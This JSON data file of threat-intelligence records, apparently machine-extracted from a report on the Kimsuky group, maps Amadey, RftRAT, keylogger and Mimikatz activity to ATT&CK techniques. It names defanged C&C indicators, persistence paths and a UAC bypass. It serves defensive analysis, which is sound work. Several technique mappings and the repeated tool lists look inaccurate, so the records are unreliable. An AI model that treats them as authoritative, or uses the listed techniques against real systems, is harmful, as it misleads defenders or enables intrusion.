              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "Proxy",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "9b7884b7-8c7f-4271-acbc-94097f14ffd6",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Persistence",
            "attack_id": "T1050",
            "tactic": "Persistence",
            "description": "Amadey malware creates a script named 'svc.vbs' in the '%ALLUSERSPROFILE%\\Startup' path to maintain persistence",
            "confidence_score": 0.739,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "svc.vbs",
              "%ALLUSERSPROFILE%\\Startup"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Rundll32.exe",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d90b9844-5056-4c6b-a24a-f954cb5ac8ad",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Remote Control Malware",
            "attack_id": "T1219",
            "tactic": "Command and Control",
            "description": "Kimsuky Group uses remote control malware (RftRAT, Amadey) for command and control",
            "confidence_score": 0.732,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RftRAT",
              "Amadey"
            ],
            "tools": [
              "RftRAT",
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "59303722-1c26-434a-95bb-594b9e71721f",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Persistence",
            "attack_id": "T1050",
            "tactic": "Persistence",
            "description": "The keylogger persists in the system and monitors key input from the user",
            "confidence_score": 0.73,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "%ALLUSERSPROFILE%\\startup\\NsiService.exe"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "Keylogger",
              "NET",
              "ping",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "003ae8fb-ec81-462a-a33f-459447009e4b",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Code Obfuscation",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "The loader reads, decrypts, and injects the htsetting.ini file located in the same path. All ht.dll loaders identified so far were packed with VMP, and the decrypted binary contained the following strings used by the threat actor.",
            "confidence_score": 0.723,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.596,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "VMP packing",
              "ht.dll",
              "htsetting.ini"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "VMP",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "19815082-d3f2-4113-89fc-43cc5c849c79",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Loader",
            "attack_id": "T1050",
            "tactic": "Defense Evasion",
            "description": "Kimsuky Group uses AutoIt to create malware (XRat loader)",
            "confidence_score": 0.722,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "XRat",
              "AutoIt"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "XRat",
              "PowerShell",
              "mimikatz",
              "reg",
              "AutoIt",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f464998b-63db-4f1f-af88-8da62c6a8589",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "Amadey malware is executed through the Rundll32.exe process",
            "confidence_score": 0.718,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.222,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Rundll32.exe"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Rundll32.exe",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7bad04b0-55df-4a1d-b81d-4bf3e6c9a047",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Spear Phishing Attack",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "Kimsuky Group uses spear phishing to gain initial access",
            "confidence_score": 0.716,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "phishing email"
            ],
            "tools": [
              "rundll32",
              "LNK Malware",
              "at",
              "metasploit",
              "Rundll32",
              "zip",
              "sc",
              "PowerShell",
              "Mimikatz",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e25fffd8-d45e-4e53-b217-79f57abed0e9",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "UAC Bypass",
            "attack_id": "T1548.002",
            "tactic": "Privilege Escalation",
            "description": "RftRAT uses the ICMLuaUtil interface of the CMSTPLUACOM component to bypass UAC and execute itself as administrator",
            "confidence_score": 0.716,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.62,
              "description_detail": 0.391,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "ICMLuaUtil",
              "CMSTPLUACOM",
              "%APPDATA%\\asc\\t1.pb"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8366ec61-9eb3-4893-b9a0-443570b3e3c9",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "Detected use of AutoIt for potential malicious script execution",
            "confidence_score": 0.714,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.192,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "autoit"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "PowerShell",
              "Mimikatz",
              "mimikatz",
              "reg",
              "AutoIt",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d535e747-4fcb-4f63-aad9-0dccc51be158",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Scripting",
            "attack_id": "T1064",
            "tactic": "Execution",
            "description": "The BAT and VBS scripts inside can either be used for executing other scripts or contain an Infostealer responsible for collecting and exfiltrating information from the infected system.",
            "confidence_score": 0.713,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.524,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "BAT scripts",
              "VBS scripts",
              "Infostealer"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "BAT",
              "sc",
              "VBS",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "801c2cec-64bc-4ae9-9cfe-073ee39c118c",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Use of Known Utilities",
            "attack_id": "T1207",
            "tactic": "Execution",
            "description": "The Kimsuky group uses a dropper to install Amadey. Amadey is a malware that began being sold on illegal forums. It is a downloader that installs additional malware from the C&C server.",
            "confidence_score": 0.711,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.556,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Amadey",
              "dropper"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3038f110-af85-4b9c-bb3d-8913b5c0ee48",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "AutoIt",
            "attack_id": "T1562.004",
            "tactic": "Execution",
            "description": "Kimsuky group used AutoIt to create malware and inject RftRAT",
            "confidence_score": 0.71,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.23,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "AutoIt"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "AutoIt",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5edabb76-550d-41aa-b8be-f24c5d4a0b3d",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Keylogger",
            "attack_id": "T1056",
            "tactic": "Credential Access",
            "description": "Kimsuky Group uses keylogger to capture credentials",
            "confidence_score": 0.709,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "keylogger"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "Keylogger",
              "NET",
              "ping",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5e3bfb36-7b01-4a14-bdf7-fce3286e955d",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "Amadey malware is loaded and executed through the Rundll32.exe process, then injected into the iexplore.exe process",
            "confidence_score": 0.695,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.405,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Rundll32.exe",
              "iexplore.exe",
              "svchost.exe"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Rundll32.exe",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "6bb52599-f1b6-468f-93b8-f2c2364fd936",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Data Exfiltration",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "The Kimsuky group ultimately uses RDP or installs Google\u2019s Chrome Remote Desktop to exfiltrate information from the infected system.",
            "confidence_score": 0.694,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.437,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RDP",
              "Google\u2019s Chrome Remote Desktop"
            ],
            "tools": [
              "rundll32",
              "RDP",
              "at",
              "metasploit",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit",
              "Google\u2019s Chrome Remote Desktop"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2d68ae5a-36b1-4e4e-82c4-f0be161cb123",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Domain Generation Algorithms",
            "attack_id": "T1583.003",
            "tactic": "Command and Control",
            "description": "Amadey uses Domain Generation Algorithms (DGA) to scan for antivirus software",
            "confidence_score": 0.689,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.29,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "DGA"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "af44da62-de82-4cb6-b693-bfed89866e96",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "Detected Phishing activity via NLP pattern matching",
            "confidence_score": 0.684,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "d3791107-b654-40eb-86f2-dc767d0e9c59",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Masquerading",
            "attack_id": "T1036",
            "tactic": "Defense Evasion",
            "description": "Threat actor installed a legitimate AutoIt executable file and a compiled AutoIt script in the infected system",
            "confidence_score": 0.681,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.391,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "AutoIt executable"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "PowerShell",
              "Mimikatz",
              "mimikatz",
              "reg",
              "AutoIt",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "94877a6c-ee97-4ac4-a3d6-1123da9a7d7a",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "RftRAT instances were packed with VMP and contained the keyword \"RFTServer\" in the decrypted strings",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RFTServer",
              "VMP"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "VMP",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "4b74adbe-8488-47a3-81ff-ac604026a2ec",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Data Exfiltration",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "RftRAT collects basic information about the infected system and sends it to the C&C server",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "%APPDATA%\\asc\\t1.pb",
              "hxxps://prohomepage[.]net/index.php"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "afd57284-a0cf-44e7-aab0-8617a00447c8",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Keylogging",
            "attack_id": "T1056",
            "tactic": "Credential Access",
            "description": "The keylogger is installed in the path %ALLUSERSPROFILE%\\startup\\NsiService.exe and monitors key input from the user",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "%ALLUSERSPROFILE%\\startup\\NsiService.exe",
              "%ALLUSERSPROFILE%\\semantec\\av\\C_1025.nls"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "Keylogger",
              "NET",
              "ping",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "75a80b89-feab-4a56-bd38-44e17d6822ba",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Mimikatz",
            "attack_id": "T1003",
            "tactic": "Credential Access",
            "description": "Kimsuky Group uses Mimikatz to capture credentials",
            "confidence_score": 0.679,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Mimikatz"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ad5b5479-6570-45ca-9437-dcbf7d480676",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Rundll32",
            "attack_id": "T1085",
            "tactic": "Defense Evasion",
            "description": "Kimsuky Group uses Rundll32 to evade defenses",
            "confidence_score": 0.679,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "rundll32.exe"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "17afcda8-7e27-4e19-a695-718d05e3eea7",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Data Encoding",
            "attack_id": "T1132",
            "tactic": "Command and Control",
            "description": "Amadey sends system information collected from the infected system to the C&C server using HTTP requests",
            "confidence_score": 0.677,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "HTTP request"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "0392ad94-9931-4055-af77-0117b16319b4",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Metasploit",
            "attack_id": "T1204",
            "tactic": "Exploitation for Client Execution",
            "description": "Kimsuky Group uses Metasploit for exploitation",
            "confidence_score": 0.676,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Metasploit"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "76e6827f-3578-42c3-a7fe-7f8ba8425f6f",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "PowerShell",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Kimsuky Group uses PowerShell for execution",
            "confidence_score": 0.676,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "powershell.exe"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c513f7e3-d9a4-41cd-807b-bd4b4c1bc3da",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Command and Control",
            "attack_id": "T1071",
            "tactic": "Command and Control",
            "description": "RftRAT communicates with the C&C server to receive commands and send data",
            "confidence_score": 0.675,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "hxxps://prohomepage[.]net/index.php",
              "45.76.93[.]204:56001",
              "%APPDATA%\\asc\\t1.pb"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2100b081-c909-4ce9-862f-dc8cefff85ab",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Info Stealing",
            "attack_id": "T1005",
            "tactic": "Credential Access",
            "description": "Malware for collecting information from web browsers were created in the %ALLUSERSPROFILE%\\semantec\\ path",
            "confidence_score": 0.673,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "%ALLUSERSPROFILE%\\semantec\\GBIA.exe",
              "%ALLUSERSPROFILE%\\semantec\\GBIC.exe"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Info Stealer",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f1596fd1-d7cd-4409-a812-1d234b946839",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "The injector injects ipcheck.dll into the explorer.exe and runtimebroker.exe processes",
            "confidence_score": 0.668,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.268,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "%ALLUSERSPROFILE%\\semantec\\taskhosts.exe",
              "ipcheck.dll"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit",
              "Injector"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3230d900-4db8-4e99-9ba0-677d99a6f984",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "PowerShell and Metasploit were detected as tools used by the threat actor",
            "confidence_score": 0.667,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.261,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "powershell.exe",
              "metasploit"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3019e43e-718e-4079-a914-de6ab0db1d3c",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected use of PowerShell and Metasploit for potential malicious command execution",
            "confidence_score": 0.664,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.238,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "powershell.exe",
              "metasploit"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
